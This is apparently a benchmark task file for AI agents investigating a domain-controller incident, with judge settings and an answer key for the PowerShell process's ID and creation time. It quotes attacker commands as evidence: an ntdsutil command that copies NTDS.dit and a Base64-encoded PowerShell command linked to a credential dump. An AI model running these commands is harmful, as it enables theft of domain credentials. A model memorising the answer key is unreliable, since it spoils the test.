@@ -1,0 +1,43 @@
+tasks:
+- task_id: incident_322_latest_cleaned_test_set_task_44
+  title: incident_322_latest_cleaned_test_set_task_44
+  description: 'A closely related alert, ''Suspicious credential dump from NTDS.dit'', was triggered shortly before this activity and involved a scripting process launched with a Base64-encoded command. What was the Process ID and creation time (UTC) of that process?'
+  inherit_shared: true
+  initial_context:
+    incident_context: 'During an investigation of a multi-stage incident on the domain controller `vnevado-dc`, an alert titled ''Ntdsutil collecting Active Directory information'' was raised at 2024-08-01 12:54 UTC. The alert showed the process `ntdsutil.exe` (Process ID 6748, created 2024-08-01T12:37:30.2769191Z) running with the command line `"ntdsutil.exe" "ac i ntds" ifm "create full c:\temp" q q`, which is a technique attackers use to gather AD data for persistence or lateral movement.'
+    question: 'A closely related alert, ''Suspicious credential dump from NTDS.dit'', was triggered shortly before this activity and involved a scripting process launched with a Base64-encoded command. What was the Process ID and creation time (UTC) of that process?'
+    # Main task submission evaluation - uses LLM-as-a-judge by default
+    # To use static matching instead, change strategy to "static" and set:
+    #   criteria:
+    #     expected_answers:
+    #       - 'Process ID: 2556, Created Time (UTC): 2024-08-01T12:37:29.6522416Z — corresponding to the process `"powershell.exe" -encodedcommand iabuahqazabzahuadabpagwalgblahgazqagacc...` (a long Base64-encoded PowerShell command)'
+  scoring:
+    llm_judge:
+      model: "{judge_llm}"
+      steps_per_message: 50
+      judge_system_template: judge/checkpoint_judge_system.md
+      judge_user_template: judge/checkpoint_judge_user.md
+      submission:
+        target: submission
+        judge_system_template: judge/submission_judge_system.md
+        judge_user_template: judge/submission_judge_user.md
+        description: 'Process ID: 2556, Created Time (UTC): 2024-08-01T12:37:29.6522416Z — corresponding to the process `"powershell.exe" -encodedcommand iabuahqazabzahuadabpagwalgblahgazqagacc...` (a long Base64-encoded PowerShell command)'
+        max_score: 1.0
+      checkpoint_1:
+        target: trajectory
+        max_score: 0.5
+        weight: 1.0
+        title: Checkpoint 1
+        description: 'The attacker ran Ntdsutil to collect Active Directory information, using process ID `6748` created at `2024-08-01t12:37:30.2769191z` with the command line `"ntdsutil.exe" "ac i ntds" ifm "create full c:\temp" q q`.'
+      checkpoint_2:
+        target: trajectory
+        max_score: 0.5
+        weight: 1.0
+        title: Checkpoint 2
+        description: 'This Ntdsutil activity was launched in the context of a credential dump from NTDS.dit, performed by the parent PowerShell process with process ID `2556`, created at `2024-08-01t12:37:29.6522416z`, with the command line `"powershell.exe" -encodedcommand iabuahqazabzahuadabpagwalgblahgazqagaccayqbjacaaaqagag4adabkahmajwagaccaaqbmag0ajwagaccaywbyaguayqb0aguaiabmahuababsacaaywa6afwadablag0acaanacaacqagaheaowagacaadwbnaguadaagaggadab0ahaacwa6ac8alwbnagkadaboahuaygauagmabwbtac8acgazag0abwb0aguaywbvag4adabyag8abaavaecaaabvahmadabwageaywbrac0aqwbvag0acabpagwazqbkaeiaaqbuageacgbpaguacwavahiayqb3ac8abqbhahmadablahialwbsahuaygblahuacwauaguaeablacaalqbvahuadabmagkabablacaadablahmadaauaguaeablacaalqb1ahmazqbiageacwbpagmacabhahiacwbpag4azwa7acaaiabpag4adgbvagsazqatahiazqbzahqabqblahqaaabvagqaiaatag0azqb0aggabwbkacaazwblahqaiaatahuacgbpacaadgblagmadabvahiacwbhag4azabhahiacgbvahcacwauagmabwbtacaalqb1ahmazqbiageacwbpagmacabhahiacwbpag4azwa7acaaiabpag4acwb0ageababsac0abqbvagqadqbsaguaiabhahoalgbhagmaywbvahuabgb0ahmaiaatahmaywbvahaazqagaemadqbyahiazqbuahqavqbzaguacgagac0argbvahiaywbladsaiabpag4acwb0ageababsac0abqbvagqadqbsaguaiabhahoalgbzahqabwbyageazwblacaaiaatahmaywbvahaazqagaemadqbyahiazqbuahqavqbzaguacgagac0argbvahiaywbladsaiaagaemabwbuag4azqbjahqalqbbahoaqqbjagmabwb1ag4adaagac0asqbkaguabgb0agkadab5adsaiaagacqargbpagwazqagacaaiaagacaaiaagacaaiaagacaaiaagad0aiaanagmaogbcahqazqbtahaaxabbagmadabpahyazqagaeqaaqbyaguaywb0ag8acgb5afwabgb0agqacwauagqaaqb0accaowagacaajabzacaapqagagcazqb0ac0ayqb6ahmadabvahiayqbnaguaqqbjagmabwb1ag4adaa7acaaiaakagmabwbuahqazqb4ahqaiaa9acaajabzac4aqwbvag4adablahgadaa7acaaiaakaemabwbuahqayqbpag4azqbyae4ayqbtaguaiaa9acaaigbhahuadabvag0ayqb0agkabwbuaciaowagacaajabcagwabwbiadmasabuacaapqagaeaaewagacaaiaagacaargbpagwazqagacaaiaagacaaiaagacaaiaagacaaiaagad0aiaakaeyaaqbsaguaowagacaaiaagacaaqwbvag4adabhagkabgblahiaiaagacaaiaagacaaiaagad0aiaakaemabwbuahqayqbpag4azqbyae4ayqbtaguaowagacaaiaagacaaqgbsag8aygagacaaiaagacaaiaagacaaiaagacaaiaagad0aiaanaekabqbhagcazqawadaamwauagoacabnaccaowagacaaiaagacaaqwbvag4adablahgadaagacaaiaagacaaiaagacaaiaagad0aiaakagmabwbuahqazqb4ahqaowagacaaiaagacaauwb0ageabgbkageacgbkaeiababvagiavabpaguacgagad0aiaanaeeacgbjaggaaqb2aguajwa7acaaiaagah0aowagafmazqb0ac0aqqb6afmadabvahiayqbnaguaqgbsag8aygbdag8abgb0aguabgb0acaaqabcagwabwbiadmasabuadsaiaagaa==`, which dumped NTDS.dit to obtain domain user credentials.'
+  scoring_aggregation:
+    max:
+      scores:
+      - submission
+      - - checkpoint_1
+        - checkpoint_2
